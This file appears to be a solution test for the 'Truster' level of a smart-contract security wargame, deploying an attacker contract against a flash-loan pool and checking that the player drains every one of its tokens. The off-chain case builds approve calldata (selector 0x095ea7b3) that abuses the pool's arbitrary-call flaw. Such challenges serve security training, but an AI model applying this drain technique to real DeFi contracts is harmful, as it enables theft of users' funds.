const { ethers } = require('hardhat');
const { expect } = require('chai');
const { utils } = require('ethers');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    beforeEach(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution onchain', async function () {
        /** CODE YOUR SOLUTION HERE */
        let attacker = await (await ethers.getContractFactory('TrusterAttacker', deployer)).deploy();
        
        await attacker.connect(player).attackOnchain(pool.address, 1000000n * 10n ** 18n,token.address);
    });

    it('Execution offchain', async function () {
        /** CODE YOUR SOLUTION HERE */
        let attacker = await (await ethers.getContractFactory('TrusterAttacker', deployer)).deploy();
        
        let data = ethers.utils.hexConcat([
            '0x095ea7b3', //TODO
            ethers.utils.defaultAbiCoder.encode(['address', 'uint256'], [attacker.address, 1000000n * 10n ** 18n])
          ])

        await attacker.connect(player).attackOffchain(pool.address, 1000000n * 10n ** 18n,token.address,data);
    });

    afterEach(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

